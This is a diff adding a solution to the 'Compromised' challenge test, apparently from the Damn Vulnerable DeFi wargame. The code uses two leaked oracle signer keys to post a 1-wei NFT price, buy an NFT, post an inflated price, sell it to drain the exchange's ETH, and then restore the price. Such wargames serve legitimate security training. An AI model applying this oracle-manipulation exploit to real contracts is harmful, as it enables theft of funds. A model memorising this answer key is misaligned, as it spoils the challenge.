@@ -20,17 +20,17 @@ describe('Compromised challenge', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
-        
+
         // Initialize balance of the trusted source addresses
         for (let i = 0; i < sources.length; i++) {
             setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
             expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
         }
-        
+
         // Player starts with limited balance
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
-        
+
         // Deploy the oracle and setup the trusted sources with initial prices
         const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
         oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
@@ -53,21 +53,42 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // HEX --> ASCII --> Base64 Decode
+        const PKEY1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const PKEY2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        const signer1 = new ethers.Wallet(PKEY1, ethers.provider)
+        const signer2 = new ethers.Wallet(PKEY2, ethers.provider)
+
+        // Set price 1 wei and NFT
+        await oracle.connect(signer1).postPrice("DVNFT", 1)
+        await oracle.connect(signer2).postPrice("DVNFT", 1)
+        await exchange.connect(player).buyOne({ value: 1 })
+
+        // Set price 999 ETH and NFT
+        await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1))
+        await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1))
+        await nftToken.connect(player).approve(exchange.address, 0)
+        await exchange.connect(player).sellOne(0)
+
+        // Set original price
+        await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE)
+        await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE)
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-        
+
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(exchange.address)
         ).to.be.eq(0);
-        
+
         // Player's ETH balance must have significantly increased
         expect(
             await ethers.provider.getBalance(player.address)
         ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
+
         // Player must not own any NFT
         expect(
             await nftToken.balanceOf(player.address)
